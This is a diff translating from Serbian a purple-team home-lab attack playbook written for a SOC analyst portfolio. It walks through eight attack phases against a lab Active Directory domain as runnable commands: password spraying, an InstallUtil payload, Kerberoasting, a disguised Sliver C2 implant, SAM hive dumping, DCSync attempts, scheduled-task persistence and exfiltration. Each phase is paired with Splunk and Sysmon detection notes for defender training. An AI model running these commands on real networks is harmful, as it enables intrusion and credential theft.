@@ -1,117 +1,119 @@
+**English** · **[Srpski](02_attack_playbook.sr.md)**
+
 # Purple Team Home Lab — Attack Playbook
 
-**Projekat:** Purple LAB — SOC Analyst Level 2  
-**Cilj:** Dokumentovati napadačke faze za defensive detection engineering  
-**Deliverable:** CV/portfolio za cybersecurity poziciju (SOC L2)
+**Project:** Purple LAB — SOC Analyst Level 2
+**Goal:** Document the attack phases to drive defensive detection engineering
+**Deliverable:** CV/portfolio for a cybersecurity (SOC L2) position
 
 ---
 
-## NAPOMENA ZA PURPLE TEAM KONTEKST
+## PURPLE TEAM CONTEXT NOTE
 
-Ovo je dokumentacija svih 8 napadačkih faza koje su testirane u izolovanom lab okruženju **isključivo za potrebe blue team treninga**. Svaka faza je mapirana na MITRE ATT&CK framework. Za svaku fazu postoji odgovarajuća detection logika u Dokumentu 3.
+This documents all 8 attack phases, run in an isolated lab environment **strictly for blue-team training**. Every phase is mapped to the MITRE ATT&CK framework. Each phase has matching detection logic in Document 3.
 
-**Defender ostaje uključen kroz ceo lab** — realan enterprise scenario.
+**Defender stays enabled throughout the lab** — a realistic enterprise scenario.
 
-**Primarni deliverable je GitHub repo** (README + detekcije kao kod) — to je ono što hiring manager skenira za ~2 min. **Video serija je opcioni deep-dive:** 8 napadačkih segmenata (1 faza = 1 segment) + Seg 9 Splunk Dashboard Tour + Seg 10 Production Hardening (bonus). Preporučeni ~1h highlight cut: Seg 4, 6, 8, 9, 10.
+**The primary deliverable is the GitHub repo** (README + detections-as-code) — that is what a hiring manager scans in ~2 minutes. **The video series is an optional deep-dive:** 8 attack segments (1 phase = 1 segment) + Seg 9 Splunk Dashboard Tour + Seg 10 Production Hardening (bonus). Recommended ~1h highlight cut: Seg 4, 6, 8, 9, 10.
 
 ---
 
-## PREGLED 8 FAZA
+## 8-PHASE OVERVIEW
 
-| # | Faza | Alat | MITRE | Status |
+| # | Phase | Tooling | MITRE | Status |
 |---|---|---|---|---|
-| 1 | Reconnaissance | nmap, kerbrute, nxc, certipy | T1046, T1087, T1018 | ✅ Radi |
-| 2 | Password Spraying | kerbrute | T1110.003 | ✅ Radi |
-| 3 | Execution (LOLBins) | InstallUtil.exe + .NET payload | T1218.004 | ✅ Radi |
-| 4 | Kerberoasting | impacket-GetUserSPNs | T1558.003 | ✅ Radi |
-| 5 | Lateral Movement | Sliver C2 mTLS | T1071.001 | ✅ Radi |
-| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002 | ✅ Lokalno radi, ❌ DCSync blokiran |
-| 7 | Persistence | schtasks (LogonTrigger) | T1053.005 | ✅ Radi |
-| 8 | C2 + Exfiltration | Sliver mTLS port 443 | T1071.001, T1041 | ✅ Radi (evasion uspešan) |
+| 1 | Reconnaissance | nmap, kerbrute, nxc, certipy | T1046, T1087, T1018 | ✅ Works |
+| 2 | Password Spraying | kerbrute | T1110.003 | ✅ Works |
+| 3 | Execution (LOLBins) | InstallUtil.exe + .NET payload | T1218.004 | ✅ Works |
+| 4 | Kerberoasting | impacket-GetUserSPNs | T1558.003 | ✅ Works |
+| 5 | Lateral Movement | Sliver C2 mTLS | T1071.001 | ✅ Works |
+| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002/.005/.006 | ✅ Local works, ❌ DCSync failed (AMSI + DRS bind) |
+| 7 | Persistence | schtasks (LogonTrigger) | T1053.005 | ✅ Works |
+| 8 | C2 + Exfiltration | Sliver mTLS port 443 | T1071.001, T1041 | ✅ Works (evasion successful) |
 
 ---
 
-## FAZA 1 — RECONNAISSANCE
+## PHASE 1 — RECONNAISSANCE
 
 **MITRE:** T1046 (Network Service Discovery), T1087 (Account Discovery), T1018 (Remote System Discovery)
 
-### Cilj
-Identifikovati AD infrastrukturu, korisnike, otvorene servise, i AD CS ranjivosti pre napada.
+### Goal
+Identify AD infrastructure, users, open services, and AD CS misconfigurations before the attack.
 
-### Komande (sa Kali, terminal)
+### Commands (from Kali, terminal)
 
 ```bash
 # 1.1 Network sweep
 nmap -sV 192.168.182.0/24
 
-# 1.2 SMB enumeracija DC-a (port 445 možda blokiran sa Kali → očekuj timeout)
+# 1.2 SMB enumeration of the DC (port 445 may be blocked from Kali → expect timeout)
 nmap -p 445 --script smb-os-discovery 192.168.182.135
 
-# 1.3 NetExec SMB enumeracija
+# 1.3 NetExec SMB enumeration
 nxc smb 192.168.182.135
 
-# 1.4 NetExec LDAP enumeracija (port 389 radi)
+# 1.4 NetExec LDAP enumeration (port 389 works)
 nxc ldap 192.168.182.135 -u '' -p '' --users
 
-# 1.5 Kerbrute — userenum (port 88 radi)
+# 1.5 Kerbrute — userenum (port 88 works)
 echo -e "Administrator\nSQLService\ntstark\nfcastle\npparker\nGuest\nfrankcastle\npeterparker" > /tmp/users.txt
 ./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users.txt
 
-# 1.6 BloodHound enumeracija (sa kompromitovanim nalogom)
+# 1.6 BloodHound enumeration (with the compromised account)
 bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
 
-# 1.7 ASREPRoast check (svi sa preauth disabled?)
+# 1.7 ASREPRoast check (anyone with pre-auth disabled?)
 impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile /tmp/users.txt
 
-# 1.8 AD CS discovery (kritično — Certipy)
+# 1.8 AD CS discovery (critical — Certipy)
 certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
 ```
 
-### Očekivani rezultati
+### Expected results
 
-- 5 živih hostova (DC, 2x Win10, Kali, Splunk)
-- LDAP enumeracija: lista korisnika MARVEL.LOCAL
-- Kerbrute potvrđuje koji korisnici postoje
-- BloodHound dump JSON fajlovi za vizualizaciju
-- ASREPRoast: nijedan korisnik nije vulnerable (svi imaju preauth)
-- **Certipy nalazi:**
+- 5 live hosts (DC, 2x Win10, Kali, Splunk)
+- LDAP enumeration: MARVEL.LOCAL user list
+- Kerbrute confirms which users exist
+- BloodHound dump JSON files for visualization
+- ASREPRoast: no user is vulnerable (all have pre-auth)
+- **Certipy findings:**
   - CA: MARVEL-HYDRA-DC-CA
-  - 33 šablona, 11 omogućenih
-  - **ESC1, ESC2, ESC3, ESC15 ranjivosti na SubCA template**
-  - ESC4 na više šablona
+  - 33 templates, 11 enabled
+  - **ESC1, ESC2, ESC3, ESC15 on the SubCA template**
+  - ESC4 on several templates
 
-### Komande koje NE rade (i zašto)
+### Commands that do NOT work (and why)
 
-- `impacket-secretsdump` direktno na DC → port 445 blokiran ❌
-- `certipy-ad req` ESC1 exploitation → port 135 RPC blokiran ❌
+- `impacket-secretsdump` directly against the DC → port 445 blocked ❌
+- `certipy-ad req` ESC1 exploitation → port 135 RPC blocked ❌
 - `certipy-ad relay` → web enrollment disabled ❌
 
-### Šta naracija video-a kaže
+### What the narration says
 
-> "Pre nego što pucam, izviđam. Šta postoji u mreži, koji korisnici, koji servisi, koje su privilegije. Certipy mi pokazuje da AD CS ima 4 ESC ranjivosti — ali firewall blokira eksploataciju. Ostavljam to za blue team narativ — 'kako se zaštititi'."
+> "Before I fire, I scout. What exists on the network, which users, which services, which privileges. Certipy shows me AD CS has 4 ESC vulnerabilities — but the firewall blocks exploitation. I leave that for the blue-team narrative — 'how to defend against it'."
 
 ---
 
-## FAZA 2 — PASSWORD SPRAYING
+## PHASE 2 — PASSWORD SPRAYING
 
 **MITRE:** T1110.003 (Password Spraying)
 
-### Cilj
-Pronaći nalog sa slabom lozinkom — jedna lozinka preko svih naloga, pa svaki nalog dobije tačno jedan neuspeli pokušaj i lockout polisa se ne okida.
+### Goal
+Find an account with a weak password — one password across all accounts, so each account gets exactly one failed attempt and the lockout policy never triggers.
 
 ### Pre-spray (recon)
 
-**Bitno za narativ — SAVET preporuka:** Prvo izvidi lockout polisu pre nego što kreneš.
+**Important for the narrative — recommended step:** Check the lockout policy first.
 
 ```bash
-# Ako imaš bilo koji nalog, proveri politiku:
+# If you have any account, check the policy:
 nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
 ```
 
-### Komande
+### Commands
 
 ```bash
-# 2.1 Pripremi listu korisnika (samo postojeći iz Faze 1)
+# 2.1 Prepare the user list (only accounts confirmed in Phase 1)
 cat > /tmp/users_clean.txt << EOF
 Administrator
 SQLService
@@ -122,38 +124,38 @@ pparker
 Guest
 EOF
 
-# 2.2 SPRAY — lockout izbegavamo JEDNOM lozinkom po nalogu, NE delay-em.
-# --delay je u milisekundama (100ms) — samo throttle, nema veze sa lockout-om.
-# Lockout bi se okinuo tek da isti nalog gađamo više puta.
+# 2.2 SPRAY — we avoid lockout with ONE password per account, NOT with delay.
+# --delay is in milliseconds (100ms) — just throttling, nothing to do with lockout.
+# Lockout would only trigger if we hit the same account multiple times.
 ./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users_clean.txt 'Password1' --delay 100
 
-# Rezultat:
+# Result:
 # [+] VALID LOGIN: fcastle@MARVEL.LOCAL:Password1
 ```
 
-### Očekivani Splunk eventi
+### Expected Splunk events
 
-- **EC4771** — Kerberos pre-auth failed (svi neuspeli pokušaji)
-- **EC4768** — TGT issued (kada Password1 uspe za fcastle)
-- **EC4625** — Account failed to log on (ako kerbrute padne na NTLM)
+- **EC4771** — Kerberos pre-auth failed (all failed attempts)
+- **EC4768** — TGT issued (when Password1 succeeds for fcastle)
+- **EC4625** — Account failed to log on (if kerbrute falls back to NTLM)
 
-### Šta naracija kaže
+### What the narration says
 
-> "Spray, ne brute force. Jedna lozinka na sve naloge. To je tiho — ne zaključavam naloge. fcastle je pao na Password1 — klasična."
+> "Spray, not brute force. One password across all accounts. It's quiet — I don't lock accounts. fcastle fell to Password1 — a classic."
 
 ---
 
-## FAZA 3 — EXECUTION (LOLBins)
+## PHASE 3 — EXECUTION (LOLBins)
 
 **MITRE:** T1218.004 (InstallUtil), T1059 (Command and Scripting Interpreter)
 
-### Cilj
-Pokrenuti payload kroz Microsoft signed binary (InstallUtil.exe) umesto direktno powershell.exe. Manje sumnjivo, prolazi neke AV politike.
+### Goal
+Run a payload through a Microsoft-signed binary (InstallUtil.exe) instead of powershell.exe directly. Less suspicious, bypasses some AV policies.
 
-### Priprema payload-a (sa Kali)
+### Payload prep (from Kali)
 
 ```bash
-# 3.1 Kreiraj .NET install payload sa Mono mcs
+# 3.1 Create a .NET install payload with Mono mcs
 cat > /tmp/Punisher.cs << 'EOF'
 using System;
 using System.Configuration.Install;
@@ -171,119 +173,119 @@ public class Punisher : Installer
 }
 EOF
 
-# 3.2 Kompajliraj sa Mono mcs
+# 3.2 Compile with Mono mcs
 mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
 ```
 
-### Delivery i izvršavanje (na THEPUNISHER)
+### Delivery and execution (on THEPUNISHER)
 
 ```powershell
-# 3.3 Preuzmi payload preko SMB share (Kali SMB server mora da radi)
+# 3.3 Fetch the payload over the SMB share (Kali SMB server must be running)
 copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll
 
-# 3.4 Pokreni preko InstallUtil (LOLBin)
+# 3.4 Run via InstallUtil (LOLBin)
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
 ```
 
-### Očekivani rezultat
+### Expected result
 
-- `C:\Temp\pwned.txt` kreiran sa `whoami` i `hostname` outputom
-- Sysmon EC1 prikazuje parent-child chain: InstallUtil.exe → cmd.exe → whoami.exe
-- EC4688 sa command line `InstallUtil.exe`
+- `C:\Temp\pwned.txt` created with `whoami` and `hostname` output
+- Sysmon EC1 shows the parent-child chain: InstallUtil.exe → cmd.exe → whoami.exe
+- EC4688 with command line `InstallUtil.exe`
 
 ### Defender behavior
 
-- Defender **NE blokira** InstallUtil — to je Microsoft signed binary
-- Defender **NE blokira** GlobalProtect_Update.dll jer je u `C:\Temp` exclusion path-u
-- AMSI **NE blokira** jer InstallUtil ne ide kroz PowerShell AMSI scan
+- Defender does **NOT block** InstallUtil — it is a Microsoft-signed binary
+- Defender does **NOT block** GlobalProtect_Update.dll because it is in the `C:\Temp` exclusion path
+- AMSI does **NOT block** because InstallUtil does not go through the PowerShell AMSI scan
 
-### Šta naracija kaže
+### What the narration says
 
-> "Ne koristim powershell.exe — koristim InstallUtil.exe. To je Microsoft signed Windows binary. Defender mu veruje. Moj payload izgleda kao DLL koji se instalira. Klasičan T1218 LOLBin attack."
+> "I don't use powershell.exe — I use InstallUtil.exe. It's a Microsoft-signed Windows binary. Defender trusts it. My payload looks like a DLL being installed. A classic T1218 LOLBin attack."
 
 ---
 
-## FAZA 4 — KERBEROASTING
+## PHASE 4 — KERBEROASTING
 
 **MITRE:** T1558.003 (Kerberoasting)
 
-### Cilj
-Izvući TGS hash service naloga sa SPN, krekovati offline da dobijemo lozinku.
+### Goal
+Extract the TGS hash of a service account with an SPN, crack it offline to recover the password.
 
-### Komande (sa Kali)
+### Commands (from Kali)
 
 ```bash
-# 4.1 GetUserSPNs — traži sve naloge sa SPN
+# 4.1 GetUserSPNs — find all accounts with an SPN
 impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request
 
-# Rezultat:
+# Result:
 # $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.LOCAL/SQLService*$xxx...
 
-# 4.2 Sačuvaj hash u fajl
+# 4.2 Save the hash to a file
 impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes
 
-# 4.3 Krekuj sa hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
+# 4.3 Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
 hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
 
-# Rezultat: MYpassword123#
+# Result: MYpassword123#
 ```
 
-### Očekivani Splunk eventi
+### Expected Splunk events
 
 - **EC4769** — Kerberos service ticket requested
-  - **Ticket Encryption Type: 0x17 (RC4-HMAC)** — ključni indikator!
+  - **Ticket Encryption Type: 0x17 (RC4-HMAC)** — the key indicator!
   - Account: fcastle (request from)
   - Service: SQLService@MARVEL.LOCAL
 
-### Šta naracija kaže
+### What the narration says
 
-> "RC4 enkripcija u Kerberos response-u je crveni alarm. Moderni Windows traži AES po default-u. RC4 znači — neko zna šta radi. SQLService nalog ima slabu lozinku. 17 sekundi za hashcat krek."
+> "RC4 encryption in a Kerberos response is a red flag. Modern Windows requests AES by default. RC4 means — someone knows what they're doing. The SQLService account has a weak password. 17 seconds for hashcat to crack it."
 
 ---
 
-## FAZA 5 — LATERAL MOVEMENT (Sliver C2)
+## PHASE 5 — LATERAL MOVEMENT (Sliver C2)
 
 **MITRE:** T1071.001 (Web Protocols), T1572 (Protocol Tunneling)
 
-### Cilj
-Uspostaviti persistent C2 kanal sa THEPUNISHER kao domain-joined platforma za napade prema DC-u.
+### Goal
+Establish a persistent C2 channel with THEPUNISHER as the domain-joined platform for attacks against the DC.
 
-### Setup Sliver server (sa Kali)
+### Sliver server setup (from Kali)
 
 ```bash
-# 5.1 Pokreni Sliver server
+# 5.1 Start the Sliver server
 sudo sliver-server
 ```
 
-Unutar Sliver konzole:
+Inside the Sliver console:
 ```
-# 5.2 Postavi mTLS listener na port 443
+# 5.2 Set up an mTLS listener on port 443
 mtls --lport 443
 
-# 5.3 Generiši Windows implant
+# 5.3 Generate a Windows implant
 generate --mtls 192.168.182.133:443 --os windows --arch amd64 --format exe --save /tmp/
 
-# Output: /tmp/INTENSIVE_WARLOCK.exe
+# Output: /tmp/INTENSIVE_WARLOCK.exe (Sliver assigns a random codename per build)
 ```
 
-### Pripremi delivery (Kali, drugi terminal)
+### Prepare delivery (Kali, second terminal)
 
 ```bash
-# 5.4 Preimenuj implant (SAVET preporuka — legitimno ime)
+# 5.4 Rename the implant (recommended — legitimate name = masquerading)
 sudo cp /tmp/INTENSIVE_WARLOCK.exe /tmp/share/GlobalProtect_Update.exe
 
-# 5.5 Pokreni SMB share
+# 5.5 Start the SMB share
 sudo impacket-smbserver share /tmp/share -smb2support
 ```
 
-### Izvršavanje na THEPUNISHER (kroz Sliver shell ili manuelno)
+### Execution on THEPUNISHER (via Sliver shell or manually)
 
 ```cmd
 copy \\192.168.182.133\share\GlobalProtect_Update.exe C:\Temp\GlobalProtect_Update.exe
 C:\Temp\GlobalProtect_Update.exe
 ```
 
-### Verifikacija sesije (Sliver konzola)
+### Session verification (Sliver console)
 
 ```
 sessions
@@ -292,10 +294,10 @@ whoami
 pwd
 ```
 
-### Lateral test — proveri konekciju prema DC
+### Lateral test — check connectivity to the DC
 
 ```
-# Iz Sliver shell-a:
+# From the Sliver shell:
 shell
 ```
 
@@ -305,49 +307,49 @@ Test-NetConnection -ComputerName 192.168.182.135 -Port 135
 ping 192.168.182.135
 ```
 
-### Očekivani Splunk eventi
+### Expected Splunk events
 
 - **Sysmon EC1** — Process Create: `GlobalProtect_Update.exe`
-- **Sysmon EC3** — Network Connect: 192.168.182.133:443 (ali samo ako proces dodat na watchlist — defaultno ne hvata)
+- **Sysmon EC3** — Network Connect: 192.168.182.133:443 (only if the process is on the watchlist — not caught by default)
 - **EC4688** — `GlobalProtect_Update.exe` started
 
-### Šta naracija kaže
+### What the narration says
 
-> "Sliver je moderan C2 — koristi mTLS na portu 443. Ime fajla GlobalProtect_Update.exe izgleda kao Palo Alto VPN update. Sysmon ne hvata ovo po default-u — to je tačno ono što ću da popravim u blue team delu."
+> "Sliver is a modern C2 — it uses mTLS on port 443. The filename GlobalProtect_Update.exe looks like a Palo Alto VPN update. Sysmon doesn't catch this by default — which is exactly what I'll fix in the blue-team part."
 
 ---
 
-## FAZA 6 — CREDENTIAL DUMPING
+## PHASE 6 — CREDENTIAL DUMPING
 
-**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — pokušan, blokiran)
+**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — attempted, failed)
 
-### Cilj
-Izvući lokalne i cached domain kredencijale sa kompromitovane mašine.
+### Goal
+Extract local and cached domain credentials from the compromised machine.
 
-### Komande (iz Sliver shell-a)
+### Commands (from the Sliver shell)
 
 ```powershell
-# 6.1 Uspostavi SMB konekciju prema DC-u (za potencijalne dalje napade)
+# 6.1 Establish an SMB connection to the DC (for potential follow-on attacks)
 net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1
 
-# 6.2 Save registry hives lokalno
+# 6.2 Save registry hives locally
 reg save HKLM\SAM C:\Temp\sam.hive
 reg save HKLM\SYSTEM C:\Temp\system.hive
 reg save HKLM\SECURITY C:\Temp\security.hive
 
-# 6.3 Kopiraj na Kali kroz SMB
+# 6.3 Copy to Kali over SMB
 copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
 copy C:\Temp\system.hive \\192.168.182.133\share\system.hive
 copy C:\Temp\security.hive \\192.168.182.133\share\security.hive
 ```
 
-### Ekstrakcija (sa Kali)
+### Extraction (from Kali)
 
 ```bash
 sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
 ```
 
-### Šta dobijaš
+### What you get
 
 ```
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
@@ -365,73 +367,76 @@ dpapi_machinekey:0x57a7e865c5b2fb91eef0506730aed4ccbb6938e0
 NL$KM:1f523cfbda5fdb429fb1a2b324c1eca0...
 ```
 
-### DCSync — pokušan, BLOKIRAN
+### DCSync — attempted, FAILED
 
 ```powershell
-# 6.4 Mimikatz DCSync (BLOKIRAN OD STRANE AMSI)
+# 6.4 Mimikatz DCSync (BLOCKED BY AMSI)
 C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
-# Rezultat: "This script contains malicious content and has been blocked by your antivirus software"
+# Result: "This script contains malicious content and has been blocked by your antivirus software"
 
-# 6.5 SharpKatz alternative (manje signature)
+# 6.5 SharpKatz alternative (AMSI-evading, compiled .NET)
 C:\Temp\SharpKatz.exe --Command dcsync --User krbtgt --Domain MARVEL.LOCAL --DomainController 192.168.182.135
-# Rezultat: "Error: 1825 - Error DC bind with default Guid"
-# Razlog: fcastle nema "Replicating Directory Changes" pravo
+# Result: "Error: 1825 - Error DC bind with default Guid" (RPC_S_SEC_PKG_ERROR)
+# Reason: Kerberos/auth error at the DRS bind (transport layer), NOT access-denied.
+#         fcastle IS a Domain Admin and DOES hold replication rights (nested BUILTIN\Administrators).
 ```
 
-### Zaključak za blue team narativ
+### Blue-team narrative — conclusion
 
-**DCSync blokiran iz dva razloga:**
-1. Defender + AMSI blokira Mimikatz signature
-2. Domain user (fcastle, SQLService) nema DCSync privilegije
+**DCSync never succeeded — but NOT because of permissions:**
+1. Defender + AMSI blocked the Mimikatz PowerShell invocation (a known tool, cut before execution)
+2. SharpKatz (AMSI-evading) passed AV, but failed at the DRS bind — RPC 1825, a Kerberos/auth error at the transport layer
 
-**Ovo je odlična blue team priča** — pokazuje da:
-- Endpoint protection (Defender) brani od poznatih alata
-- AD nije misconfigurisan sa previše privilegija
-- Bez Domain Admin naloga, DCSync neće raditi
+**Why this is a stronger blue-team story than "no privileges":**
+- AMSI stops the **tool**, not the **technique** — that is the control that actually worked
+- fcastle is a Domain Admin (nested `BUILTIN\Administrators`) and **DOES hold** `DS-Replication-Get-Changes` / `-All` — privilege was never the barrier
+- The control that would actually detect DCSync is SACL auditing — EC4662 with replication GUIDs (visibility, not prevention)
+- The durable fix is **least privilege** — tiering admin accounts (Tier 0 isolation) so a compromised endpoint-admin can't reach a DA and abuse replication rights, not relying on AV signatures → Lab v2
 
-### Očekivani Splunk eventi
+### Expected Splunk events
 
-- **EC4688** sa command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — kritični indikator
-- **EC4688** sa `net.exe use \\192.168.182.135\IPC$` — auth pokušaj prema DC-u
-- **Defender Operational log** — blokade Mimikatz signature
-- **Sysmon EC11** — File Create za sam.hive, system.hive, security.hive
+- **EC4688** with command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — critical indicator
+- **EC4688** with `net.exe use \\192.168.182.135\IPC$` — auth attempt against the DC
+- **Defender Operational log (EC1116/1117)** — Mimikatz signature blocks
+- **Sysmon EC11** — File Create for sam.hive, system.hive, security.hive
+- **EC4662** with replication GUIDs — the DCSync signature (requires SACL auditing on the DC)
 
-### Šta naracija kaže
+### What the narration says
 
-> "reg save SAM — to je trag koji svaki SOC analitičar treba da vidi. Defender ne blokira reg.exe jer je legitiman Windows alat. Ali kombinacija `save` + `SAM/SYSTEM/SECURITY` — to je crveni alarm."
+> "reg save SAM — that's the trace every SOC analyst should see. Defender doesn't block reg.exe because it's a legitimate Windows tool. But the combination of `save` + `SAM/SYSTEM/SECURITY` — that's a red alarm."
 
 ---
 
-## FAZA 7 — PERSISTENCE
+## PHASE 7 — PERSISTENCE
 
 **MITRE:** T1053.005 (Scheduled Task/Job)
 
-### Cilj
-Obezbediti persistence — da implant ostane živ posle reboot-a.
+### Goal
+Establish persistence — keep the implant alive after reboot.
 
-### Komande (iz Sliver shell-a)
+### Commands (from the Sliver shell)
 
 ```powershell
-# 7.1 Pre-flight — proveri da audit policy hvata task creation
+# 7.1 Pre-flight — confirm audit policy captures task creation
 auditpol /get /subcategory:"Other Object Access Events"
-# Ako "No Auditing":
+# If "No Auditing":
 auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
 
-# 7.2 Kreiraj scheduled task — LogonTrigger
+# 7.2 Create a scheduled task — LogonTrigger
 schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f
 
-# 7.3 Verifikuj
+# 7.3 Verify
 schtasks /query /tn "WindowsUpdateService"
 ```
 
-### Test persistence
+### Persistence test
 
 ```powershell
-# Logoff/logon ili reboot — task će pokrenuti implant
-# Ako koristimo Sliver, videćeš novu sesiju u konzoli
+# Logoff/logon or reboot — the task will launch the implant
+# If using Sliver, you'll see a new session in the console
 ```
 
-### Očekivani Splunk eventi
+### Expected Splunk events
 
 - **EC4698** — Scheduled Task Created
   - Task Name: `\WindowsUpdateService`
@@ -440,274 +445,218 @@ schtasks /query /tn "WindowsUpdateService"
   - Trigger: `LogonTrigger`
   - Principal: `S-1-5-18` (SYSTEM)
 
-### Šta naracija kaže
+### What the narration says
 
-> "Scheduled task sa logon trigger-om, running as SYSTEM. To je klasičan persistence pattern. EC4698 u Splunk-u uhvati ovo sa kompletnim XML sadržajem — Task name, command path, principal."
+> "A scheduled task with a logon trigger, running as SYSTEM. That's a classic persistence pattern. EC4698 in Splunk captures this with the full XML content — task name, command path, principal."
 
 ---
 
-## FAZA 8 — C2 + EXFILTRATION
+## PHASE 8 — C2 + EXFILTRATION
 
 **MITRE:** T1071.001 (Web Protocols), T1041 (Exfiltration Over C2 Channel)
 
-### Cilj
-Demonstrirati ongoing C2 komunikaciju i exfiltration kroz Sliver mTLS kanal.
+### Goal
+Demonstrate ongoing C2 communication and exfiltration over the Sliver mTLS channel.
 
 ### Setup
 
-Sliver C2 već radi od Faze 5. Beaconing ide na port 443 prema Kali-ju.
+Sliver C2 has been running since Phase 5. Beaconing goes to port 443 toward Kali.
 
-### Exfiltration test (iz Sliver konzole)
+### Exfiltration test (from the Sliver console)
 
 ```
-# 8.1 Sa kompromitovane mašine, prikupi loot
+# 8.1 From the compromised machine, collect loot
 shell
 ```
 
 ```powershell
-# Kreiraj lažni "sensitive" fajl
+# Create a fake "sensitive" file
 echo "Top secret data: customer database backup" > C:\Temp\loot.txt
 exit
 ```
 
 ```
-# 8.2 Exfiltration kroz Sliver kanal
+# 8.2 Exfiltrate over the Sliver channel
 download C:\Temp\loot.txt
 ```
 
-### C2 beaconing analiza
+### C2 beaconing analysis
 
-Sliver beacon obrasci:
-- Default interval: 60 sekundi
+Sliver beacon patterns:
+- Default interval: 60 seconds
 - Jitter: 30%
-- Protocol: mTLS na port 443
+- Protocol: mTLS on port 443
 - Destination IP: 192.168.182.133 (Kali)
 - Process: `GlobalProtect_Update.exe`
 
-### Očekivani Splunk eventi (KLJUČNO za blue team narativ)
+### Expected Splunk events (KEY for the blue-team narrative)
 
-**Default Sysmon config — NE HVATA Sliver beaconing** jer NetworkConnect nije uključen za procese iz user-writable putanja (default Sysmon ne loguje svaki odlazni konekt).
+**Default Sysmon config does NOT capture Sliver beaconing** because NetworkConnect is not enabled for processes from user-writable paths (default Sysmon doesn't log every outbound connect).
 
 ```spl
-# Ovaj upit NEĆE pokazati Sliver
-index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 
+# This query will NOT show Sliver
+index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
   dst_port=443
 ```
 
-**Detection iteration — behavioral, NE po imenu fajla:**
+**Detection iteration — behavioral, NOT by filename:**
 
-Naivni fix bi bio dodati `GlobalProtect_Update.exe` na watchlist — anti-pattern, napadač
-preimenuje binar i detekcija pada. Pravi gap je precizniji: SwiftOnSecurity baseline već
-loguje NetworkConnect iz `C:\Users` (pokriva AppData/Public), `C:\ProgramData` i
-`C:\Windows\Temp` — ali NE iz golog `C:\Temp`, gde je naš implant. Jedna linija u postojeću
-`<NetworkConnect onmatch="include">` sekciju zatvara tačno tu rupu:
+The naive fix would be to add `GlobalProtect_Update.exe` to a watchlist. That's an anti-pattern —
+the attacker renames the binary and the detection dies. We detect **location + behavior**,
+not the name: any process from a user-writable path that initiates egress.
 
 ```xml
-<Image name="PurpleLab" condition="begin with">C:\Temp\</Image>
+<NetworkConnect onmatch="include">
+  <!-- any process from a user-writable path making a network connection -->
+  <Image condition="contains">\Temp\</Image>
+  <Image condition="contains">\AppData\</Image>
+  <Image condition="contains">\ProgramData\</Image>
+  <Image condition="contains">\Users\Public\</Image>
+</NetworkConnect>
 ```
 
-Posle restart-a Sysmon-a, ponovo pokreni implant — Splunk hvata EC3 sa Kali destination.
-Fidelity diže beacon-interval analiza (Sliver default 60s ± 30%), ne ime procesa. Pun config
-je u `config/sysmonconfig.xml`; vendor-agnostic verzija je Sigma rule 7 u
-`detections/sigma/sigma_rules.yml`.
+After restarting Sysmon, re-run the implant — Splunk captures EC3 with the Kali destination.
+Fidelity is raised by beacon-interval analysis (Sliver default 60s ± 30%), not the process name.
+The vendor-agnostic version is Sigma rule 7 in `detections/sigma/sigma_rules.yml`.
 
-### Šta naracija kaže
+### What the narration says
 
-> "Ovo je purple team pointa. Sliver radi, beaconing radi, ali default Sysmon NE LOGUJE network connect za njega. Gap nije u imenu fajla — to je zamka. Ako popravim detekciju na ime `GlobalProtect_Update.exe`, napadač preimenuje binarni fajl i ja sam slep. Zato detektujem lokaciju i ponašanje: bilo koji proces iz user-writable putanje koji ide na mrežu, plus beacon-interval analiza. To je razlika između L1 IOC-a i L2 behavioral detekcije."
+> "This is the purple-team point. Sliver runs, beaconing runs, but default Sysmon does NOT log its network connect. The gap is not in the filename — that's the trap. If I key the detection on the name `GlobalProtect_Update.exe`, the attacker renames the binary and I'm blind. So I detect location and behavior: any process from a user-writable path that reaches the network, plus beacon-interval analysis. That's the difference between an L1 IOC and L2 behavioral detection."
 
 ---
 
-## REDOSLED IZVRŠAVANJA ZA SNIMANJE VIDEA
+## EXECUTION ORDER FOR RECORDING
 
 ### Pre-flight (5 min)
 
